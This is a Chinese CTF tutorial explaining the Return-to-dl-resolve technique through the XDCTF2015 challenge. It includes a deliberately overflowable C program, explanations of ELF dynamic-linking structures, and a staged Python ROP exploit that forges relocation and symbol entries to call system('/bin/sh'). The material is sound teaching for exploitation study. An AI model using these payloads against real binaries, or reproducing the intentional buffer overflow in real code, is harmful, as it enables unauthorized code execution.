# 通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）

0x00 前言
=======

* * *

玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖libc的手法。

以XDCTF2015-EXPLOIT2为例，这题当时是只给了可执行文件的。出这题的初衷就是想通过Return-to-dl-resolve的手法绕过NX和ASLR的限制。本文将详细介绍一下该手法的利用过程。

这里构造一个存在栈缓冲区溢出漏洞的程序，以方便后续我们构造ROP链。

```
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin,buf);
    read(0,buf,256); // Buffer OverFlow
}

int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout,buf);
    write(1,buf,strlen(buf));

    vuln();

    return 0;
}

```

0x01 准备知识
=========

* * *

### 相关结构

ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为`PT_DYNAMIC`的段，它包含`.dynamic`节区。结构如图，

```
typedef struct {
    Elf32_Sword d_tag;
    union {
        Elf32_Word  d_val;
        Elf32_Addr  d_ptr;
    } d_un;
} Elf32_Dyn;

```

其中Tag对应着每个节区。比如`JMPREL`对应着`.rel.plt`

![Alt text](http://drops.javaweb.org/uploads/images/0d5d8c9999babde0eae70b2759f73954cda4556b.jpg)

节区中包含目标文件的所有信息。节的结构如图。

```
typedef struct{
    Elf32_Word sh_name;        // 节区头部字符串表节区的索引
    Elf32_Word sh_type;        // 节区类型
    Elf32_Word sh_flags;       // 节区标志，用于描述属性
    Elf32_Addr sh_addr;        // 节区的内存映像
    Elf32_Off  sh_offset;      // 节区的文件偏移
    Elf32_Word sh_size;        // 节区的长度
    Elf32_Word sh_link;        // 节区头部表索引链接
    Elf32_Word sh_info;        // 附加信息
    Elf32_Word sh_addralign;   // 节区对齐约束
    Elf32_Word sh_entsize;     // 固定大小的节区表项的长度
}Elf32_Shdr;

```

如图，列出了该文件的28个节区。其中类型为REL的节区包含重定位表项。

![Alt text](http://drops.javaweb.org/uploads/images/2edf1a3ddb5a7d163d37f0ea3ac61e8f6d9bd721.jpg)

（1） 其中`.rel.plt`节是用于函数重定位，`.rel.dyn`节是用于变量重定位

```
typedef struct {
    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;      // 符号表索引
} Elf32_Rel;
#define ELF32_R_SYM(i) ((i)>>8)
#define ELF32_R_TYPE(i) ((unsigned char)(i))
#define ELF32_R_INFO(s, t) (((s)<<8) + (unsigned char)(t))

```

如图，在`.rel.plt`中列出了链接的C库函数，以下均已`write`函数为例，`write`函数的`r_offset=0x804a010`,`r_info=0x507`

![Alt text](http://drops.javaweb.org/uploads/images/ff493df0fd449d8cb831615144904cb84725d535.jpg)

（2） 其中`.got`节保存全局变量偏移表，`.got.plt`节存储着全局函数偏离表。`.got.plt`对应着`Elf32_Rel`结构中`r_offset`的值。如图，`write`函数在GOT表中位于`0x804a010`

![Alt text](http://drops.javaweb.org/uploads/images/c636d765da0324407c0aab1ae74d6a4d36c93ac5.jpg)

（3）其中`.dynsym`节区包含了动态链接符号表。其中，`Elf32_Sym[num]`中的`num`对应着`ELF32_R_SYM(Elf32_Rel->r_info)`。根据定义，`ELF32_R_SYM(Elf32_Rel->r_info) = (Elf32_Rel->r_info)>>8`。

```
typedef struct
{
    Elf32_Word    st_name;   /* Symbol name (string tbl index) */
    Elf32_Addr    st_value;  /* Symbol value */
    Elf32_Word    st_size;   /* Symbol size */
    unsigned char st_info;   /* Symbol type and binding */
    unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
    Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;

```

如图，`write`的索引值为`ELF32_R_SYM(0x507) = 0x507 >> 8 = 5`。而`Elf32_Sym[5]`即保存着`write`的符号表信息。并且`ELF32_R_TYPE(0x507) = 7`,对应`R_386_JUMP_SLOT`

![Alt text](http://drops.javaweb.org/uploads/images/410e403e124d8abe46bedc382b8364887a6f67a5.jpg)

（4）其中`.dynstr`节包含了动态链接的字符串。这个节区以`\x00`作为开始和结尾，中间每个字符串也以`\x00`间隔。如图，`Elf32_Sym[5]->st_name = 0x54`,所以`.dynstr`加上`0x54`的偏移量，就是字符串`write`

![Alt text](http://drops.javaweb.org/uploads/images/bbe60f14fcca47ddf20ed8173d71689d75ab6165.jpg)

（5）其中`.plt`节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。如图，当程序执行`callwrite@plt`时，实际会跳到`0x80483c0`去执行。

![Alt text](http://drops.javaweb.org/uploads/images/bc70d422509e14a495aa4f34dd14b7abc0c4d88b.jpg)

### 延迟绑定

程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。

具体来说，在前一部分我们已经知道，当程序执行`callwrite@plt`时，实际会跳到`0x80483c0`去执行。而`0x80483c0`处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。

![Alt text](http://drops.javaweb.org/uploads/images/bc70d422509e14a495aa4f34dd14b7abc0c4d88b.jpg)

第一行，上一部分也提到了`0x804a010`是`write`的GOT表位置，当我们第一次调用`write`时，其对应的GOT表里并没有存放`write`的真实地址，而是下一条指令的地址。第二、三行，把`reloc_arg=0x20`作为参数推入栈中，跳到`0x8048370`继续执行。

![Alt text](http://drops.javaweb.org/uploads/images/65c599e67ef9ef356a899c5693e79e9353579fee.jpg)

`0x8048370`再把`link_map = *(GOT+4)`作为参数推入栈中，而`*(GOT+8)`中保存的是`_dl_runtime_resolve`函数的地址。因此以上指令相当于执行了`_dl_runtime_resolve(link_map, reloc_arg)`，该函数会完成符号的解析，即将真实的`write`函数地址写入其`GOT`条目中，随后把控制权交给`write`函数。

![Alt text](http://drops.javaweb.org/uploads/images/244c757d11bd6caf8c9bed55a8f8f1fd54d91ffb.jpg)

其中`_dl_runtime_resolve`是在`glibc-2.22/sysdeps/i386/dl-trampoline.S`中用汇编实现的。`0xf7ff04fb`处即调用`_dl_fixup`，并且通过寄存器传参。

![Alt text](http://drops.javaweb.org/uploads/images/73510512b42364a35d8ba6e048b3d0ef478571ca.jpg)

其中`_dl_fixup`是在`glibc-2.22/elf/dl-runtime.c`实现的，我们只关注一些主要函数。

```
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)

```

首先通过参数`reloc_arg`计算重定位入口，这里的`JMPREL`即`.rel.plt`，`reloc_offset`即`reloc_arg`。

```
const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);

```

然后通过`reloc->r_info`找到`.dynsym`中对应的条目。

```
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];

```

这里还会检查`reloc->r_info`的最低位是不是`R_386_JUMP_SLOT=7`

```
assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

```

接着通过`strtab + sym->st_name`找到符号表字符串，`result`为libc基地址

```
result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);

```

`value`为libc基址加上要解析函数的偏移地址，也即实际地址。

```
value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);

```

最后把`value`写入相应的GOT表条目中

```
return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);

```

### 漏洞利用方式

1.  控制EIP为PLT[0]的地址，只需传递一个`index_arg`参数
2.  控制`index_arg`的大小，使`reloc`的位置落在可控地址内
3.  伪造`reloc`的内容，使`sym`落在可控地址内
4.  伪造`sym`的内容，使`name`落在可控地址内
5.  伪造`name`为任意库函数，如`system`

### 控制EIP

首先确认一下进程当前开了哪些保护

![Alt text](http://drops.javaweb.org/uploads/images/a335423cb0291894f5784c64a43edc80f24a5b22.jpg)

由于程序存在栈缓冲区漏洞，我们可以用PEDA很快定位覆写EIP的位置。

![Alt text](http://drops.javaweb.org/uploads/images/688a4c18e5cffac10f77865406ae3bc81517ff2e.jpg)

**stage1**

我们先写一个ROP链，直接返回到`write@plt`

```
from zio import *

offset = 112

addr_plt_read  = 0x08048390   # objdump -d -j.plt bof | grep "read"
addr_plt_write = 0x080483c0   # objdump -d -j.plt bof | grep "write"

#./rp-lin-x86  --file=bof --rop=3 --unique > gadgets.txt
pppop_ret = 0x0804856c
pop_ebp_ret   =  0x08048453
leave_ret = 0x08048481

stack_size = 0x800
addr_bss   = 0x0804a020   # readelf -S bof | grep ".bss"
base_stage = addr_bss + stack_size

target = "./bof"
io   = zio((target))

io.read_until('Welcome to XDCTF2015~!\n')
# io.gdb_hint([0x80484bd])

buf1  = 'A' * offset
buf1 += l32(addr_plt_read)
buf1 += l32(pppop_ret)
buf1 += l32(0)
buf1 += l32(base_stage)
buf1 += l32(100)
buf1 += l32(pop_ebp_ret)
buf1 += l32(base_stage)
buf1 += l32(leave_ret)
io.writeline(buf1)

cmd = "/bin/sh"

buf2 = 'AAAA'
buf2 += l32(addr_plt_write)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

最后会把我们输入的`cmd`打印出来

![Alt text](http://drops.javaweb.org/uploads/images/7c690f7a0452e2fb0bbe64fd021674947c37a84c.jpg)

**stage2**

这次我们控制EIP返回到`PLT0`，要带上`index_offset`。这里我们修改一下`buf2`

```
...
cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
index_offset   = 0x20

buf2 = 'AAAA'
buf2 += l32(addr_plt_start)
buf2 += l32(index_offset)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

同样会把我们输入的`cmd`打印出来

![Alt text](http://drops.javaweb.org/uploads/images/171ae12ce6523c5114071ca07d784545a8dd505a.jpg)

**stage3**

这一次我们控制`index_offset`，使其指向我们伪造的`fake_reloc`

```
...
cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a020
r_info         = 0x507
fake_reloc     = l32(addr_got_write) + l32(r_info)

buf2 = 'AAAA'
buf2 += l32(addr_plt_start)
buf2 += l32(index_offset)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += fake_reloc
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

同样会把我们输入的`cmd`打印出来

![Alt text](http://drops.javaweb.org/uploads/images/c3e4b6db60bfd9b6355b75cfc64b56aebf3b4505.jpg)

**stage4**

这一次我们伪造`fake_sym`，使其指向我们控制的`st_name`

```
cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a020
addr_dynsym    = 0x080481d8
addr_dynstr    = 0x08048268
fake_sym       = base_stage + 36
align          = 0x10 - ((fake_sym - addr_dynsym) & 0xf)
fake_sym       = fake_sym + align
index_dynsym   = (fake_sym - addr_dynsym) / 0x10
r_info         = (index_dynsym << 8 ) | 0x7
fake_reloc     = l32(addr_got_write) + l32(r_info)
st_name        = 0x54
fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)

buf2 = 'AAAA'
buf2 += l32(addr_plt_start)
buf2 += l32(index_offset)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += fake_reloc
buf2 += 'B' * align
buf2 += fake_sym 
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

同样会把我们输入的`cmd`打印出来

![Alt text](http://drops.javaweb.org/uploads/images/3ae7bbcb2cd6ef1dcefdfd7daeabe175f3beb9e9.jpg)

**stage5**

这次把`st_name`指向我们伪造的字符串`write`

```
...
cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a020
addr_dynsym    = 0x080481d8
addr_dynstr    = 0x08048268
addr_fake_sym  = base_stage + 36
align          = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
addr_fake_sym  = addr_fake_sym + align
index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10
r_info         = (index_dynsym << 8 ) | 0x7
fake_reloc     = l32(addr_got_write) + l32(r_info)
st_name        = (addr_fake_sym + 16) - addr_dynstr
fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)

buf2 = 'AAAA'
buf2 += l32(addr_plt_start)
buf2 += l32(index_offset)
buf2 += 'AAAA'
buf2 += l32(1)
buf2 += l32(base_stage+80)
buf2 += l32(len(cmd))
buf2 += fake_reloc
buf2 += 'B' * align
buf2 += fake_sym
buf2 += "write\x00"
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

同样会把我们输入的`cmd`打印出来

![Alt text](http://drops.javaweb.org/uploads/images/8336b0988dfb34b8d9183b6bb17cca112f2f818f.jpg)

**stage6**

替换`write`为`system`,并修改`system`的参数

```
...
cmd = "/bin/sh"
addr_plt_start = 0x8048370 # objdump -d -j.plt bof
addr_rel_plt   = 0x8048318 # objdump -s -j.rel.plt a.out
index_offset   = (base_stage + 28) - addr_rel_plt
addr_got_write = 0x804a020
addr_dynsym    = 0x080481d8
addr_dynstr    = 0x08048268
addr_fake_sym  = base_stage + 36
align          = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
addr_fake_sym  = addr_fake_sym + align
index_dynsym   = (addr_fake_sym - addr_dynsym) / 0x10
r_info         = (index_dynsym << 8 ) | 0x7
fake_reloc     = l32(addr_got_write) + l32(r_info)
st_name        = (addr_fake_sym + 16) - addr_dynstr
fake_sym       = l32(st_name) + l32(0) + l32(0) + l32(0x12)

buf2 = 'AAAA'
buf2 += l32(addr_plt_start)
buf2 += l32(index_offset)
buf2 += 'AAAA'
buf2 += l32(base_stage+80)
buf2 += 'aaaa'
buf2 += 'aaaa'
buf2 += fake_reloc
buf2 += 'B' * align
buf2 += fake_sym
buf2 += "system\x00"
buf2 += 'A' * (80-len(buf2))
buf2 += cmd + '\x00'
buf2 += 'A' * (100-len(buf2))
io.writeline(buf2)
io.interact()

```

得到一个`shell`

![Alt text](http://drops.javaweb.org/uploads/images/8bc9f183f69cc92019e5f056ed4f3b63eed258c6.jpg)

### WTF

以上只是叙述原理，当然你比较懒的话，这里已经有成熟的工具辅助编写利用脚本[roputils](https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py)